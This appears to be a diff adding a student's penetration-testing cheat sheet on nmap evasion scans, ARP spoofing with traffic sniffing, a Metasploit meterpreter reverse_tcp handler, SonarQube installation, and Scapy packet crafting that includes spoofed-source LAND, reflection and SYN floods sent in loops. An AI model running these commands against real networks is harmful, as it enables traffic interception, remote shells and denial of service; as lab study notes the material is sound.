@@ -1,0 +1,138 @@
+Some Pseudo Notes
+
+NMAP
+========================================
+- Null Scan: nmap -sN -p 20-25 192.168.56.20
+- XMAS Scan: nmap -sX -p 20-25 192.168.56.20
+- Specific Port: nmap -sS -p 21,22,23,25,53,80,139,445,995 -g 53 192.168.56.20
+- Decoy Scan:	nmap -sS -p 22,80 -D 192.168.56.30,192.168.56.40,x.x.x.x 192.168.56.20
+		nmap -sS -p 22,80 -D ME,RND:10 192.168.56.20
+		nmap -sS -D RND:10 -p 21,22,80,111 192.168.56.101 
+- Idle/Zombie: nmap -sI 192.168.56.30 192.168.56.20
+- OS Detection: nmap -p0-65535 -sS -sV -O -sC --reason 192.168.56.20
+- Covert Scan: 	nmap -sSVC -p- --source-port 53 --min-parallelism 10 --min-hostgroup 10 --max-hostgroup 20 --max-retries 2 --max-scan-delay 5 target_range 
+		nmap -sN -g 53 -D RND:5 -p 21,22,80,111 --reason 192.168.56.101
+
+ARP Spook
+=========================================
+# arp -an
+# arpspoof -i eth1 -t 192.168.206.141 192.168.206.2 
+- cat /proc/sys/net/ipv4/ip_forward 
+# urlsnarf -i eth1 
+# driftnet -i eth1
+
+Social Engineering Toolkit
+=========================================
+# setoolkit
+
+Metasploit
+=========================================
+# systemctl is-active postgresql 
+# msfdb init
+# sudo msfdb reinit
+# sudo msfconsole
+# use payload/windows/x64/meterpreter/reverse_tcp
+# show options
+# set LHOST
+
+# use multi/handler
+(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+(multi/handler) > set LHOST <attacker ip>
+(multi/handler) > set LPORT <7777>
+(multi/handler) > run
+
+msf > db_nmap -sSVC --script=vuln -O 192.168.74.178
+msf > search "vsftpd"
+msf > search type:exploit vsftpd
+msf > search type:exploit os:linux vsftpd
+
+
+SonarQube
+=========================================
+Installation:
+````````````` 
+# mkdir /sonar
+# cd /sonar/
+# wget https://binaries.sonarsource.com/Distribution/sonarqube/sonarqube-25.12.0.117093.zip
+ 
+# unzip sonarqube-25.12.0.117093.zip
+
+# apt install openjdk-21-jre -y
+
+# chown kali:kali /sonar -R 
+# su - kali
+$ cd /sonar/sonarqube-25.12.0.117093/bin
+$ ls
+elasticsearch  linux-x86-64/  macosx-universal-64/  windows-x86-64/  winsw-license/
+
+$ uname -m
+x86_64
+
+$ cd linux-x86-64/
+$ ls 
+sonar.sh
+
+$ ./sonar.sh start|console
+
+Port: 9000
+Username: admin
+Password: admin
+
+
+# pip3 install pysonar 
+# pysonar --sonar-host-url=http://<sonarqube_machine IP>:9000 --sonar-token=<token milel> --sonar-project-key=demo 
+
+
+Scapy
+==========================================
+>>> x = IP()
+>>> y = ICMP()
+>>> x.show()
+>>> y.show()
+>>> x.src="x.x.x.x"
+>>> x.dst="x.x.x.x"
+>>> send(x/y)
+>>> send(x/y/"LOLOLOLOL")
+>>> send(x/y, count=10) 
+>>> send(x/y, loop=1)
+
+------------------------------------------
+>>> a = IP()
+>>> b = TCP()
+>>> a.src="x.x.x.x"
+>>> a.dst="196.1.113.45"
+>>> b.sport=53
+>>> b.dport=80
+>>> b.flags = "S"
+
+>>> send((a/b), count=10)
+
+------------------------------------------
+>>> x = IP()/ICMP()
+>>> x.show()
+
+>>> x.src="victim'IP"
+>>> x.dst="target'IP"
+
+>>> x.show()
+>>> send(x,loop=1)
+
+------------------------------------------
+>>> x = IP()/TCP()
+>>> x.show()
+
+>>> x.src="victim'IP"
+>>> x.dst="victim'IP"
+
+>>> x.show()
+>>> send(x,loop=1)
+
+------------------------------------------
+>>> a = IP()
+>>> b = TCP()
+
+>>> a.src="zombie'IP"
+>>> a.dst="victim'IP"
+>>> b.flags="s"
+
+>>> send(a/b,loop=1)
